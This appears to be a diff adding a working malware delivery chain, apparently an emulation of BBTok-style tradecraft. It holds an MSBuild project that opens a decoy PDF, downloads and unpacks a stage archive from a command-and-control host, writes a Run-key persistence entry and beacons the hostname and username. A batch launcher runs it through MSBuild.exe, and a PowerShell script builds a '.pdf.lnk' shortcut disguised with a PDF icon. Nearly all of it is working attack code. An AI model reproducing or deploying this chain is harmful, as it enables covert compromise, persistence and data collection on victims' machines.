@@ -1,0 +1,79 @@
+
+<Project ToolsVersion="4.0" DefaultTargets="EDRChain" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <PropertyGroup>
+    <KaliIP>10.99.156.47</KaliIP>
+    <C2Port>8080</C2Port>
+    <WorkDir>C:\ProgramData\BBTok</WorkDir>
+  </PropertyGroup>
+
+  <Target Name="EDRChain">
+    <Exec Command='cmd.exe /c start "" "$(MSBuildThisFileDirectory)decoy.pdf"' IgnoreExitCode="true" />
+    <Exec Command="powershell.exe -NoP -W Hidden -Command &quot;[System.Threading.Mutex]::new($false,'BBTok_Mutex') | Out-Null&quot;" />
+    <Exec Command="cmd.exe /c mkdir &quot;$(WorkDir)&quot;" IgnoreExitCode="true" />
+    <Exec Command="powershell.exe -NoP -W Hidden -Command &quot;[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; iwr 'http://$(KaliIP):$(C2Port)/stage.zip' -OutFile $env:TEMP\stage.zip -UseBasicParsing&quot;" />
+    <Exec Command="powershell.exe -NoP -W Hidden -Command &quot;if (Test-Path $env:TEMP\stage.zip) { try { Expand-Archive -LiteralPath $env:TEMP\stage.zip -DestinationPath '$(WorkDir)' -Force } catch { Add-Type -A System.IO.Compression.FileSystem; [IO.Compression.ZipFile]::ExtractToDirectory($env:TEMP+'\stage.zip','$(WorkDir)') } }&quot;" />
+    <Exec Command="reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v BBTok /t REG_SZ /d &quot;rundll32.exe url.dll,FileProtocolHandler http://$(KaliIP):$(C2Port)/persist&quot; /f" />
+    <Exec Command="rundll32.exe url.dll,FileProtocolHandler http://$(KaliIP):$(C2Port)/beacon?host=%COMPUTERNAME%&amp;user=%USERNAME%" />
+  </Target>
+</Project>
+
+
+@echo off
+setlocal
+pushd "%~dp0"
+REM --- pick msbuild (x64 first, then x86) ---
+set MSB64=%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe
+set MSB32=%WINDIR%\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe
+set MSB=
+if exist "%MSB64%" set MSB=%MSB64%
+if not defined MSB if exist "%MSB32%" set MSB=%MSB32%
+if not defined MSB (
+  echo MSBuild not found. Install .NET Framework Dev Pack or Visual Studio Build Tools.
+  pause
+  exit /b 1
+)
+"%MSB%" "%~dp0edr_chain.xml" /t:EDRChain /nologo /v:m
+popd
+
+
+
+
+
+
+
+# --- Config ---
+$BatPath   = "C:\Temp\Open_Link.bat"          # your batch file
+$OutputDir = "C:\Temp"                         # where to drop the fake pdf shortcut
+$PdfName   = "Quarterly_Report.pdf"           # how the shortcut should appear
+$LogPath   = Join-Path $OutputDir "Quarterly_Report_log.pdf"  # text log (named .pdf)
+
+# Ensure output dir exists
+New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null
+
+# The real shortcut file will be *.lnk. We name it "something.pdf.lnk"
+$ShortcutPath = Join-Path $OutputDir ($PdfName + ".lnk")
+
+# Choose a PDF-looking icon if Reader is present; otherwise a generic shell icon
+$acroExe = "C:\Program Files\Adobe\Acrobat Reader\Reader\AcroRd32.exe"
+$icon    = (Test-Path $acroExe) ? "$acroExe,0" : "$env:SystemRoot\System32\shell32.dll,70"
+
+# We launch via cmd.exe so we can both run the BAT and append to a log
+$targetExe = "$env:SystemRoot\System32\cmd.exe"
+$arguments = ('/c ""{0}" & echo %DATE% %TIME%>>"{1}"""' -f $BatPath, $LogPath)
+
+# Create the shortcut
+$shell = New-Object -ComObject WScript.Shell
+$sc = $shell.CreateShortcut($ShortcutPath)
+$sc.TargetPath       = $targetExe
+$sc.Arguments        = $arguments
+$sc.WorkingDirectory = Split-Path $BatPath
+$sc.Description      = "Opens $PdfName"
+$sc.IconLocation     = $icon
+$sc.WindowStyle      = 1   # normal window (use 7 for minimized)
+$sc.Save()
+
+Write-Host "Created: $ShortcutPath"
+Write-Host "Logs will append to: $LogPath"
+
+
+
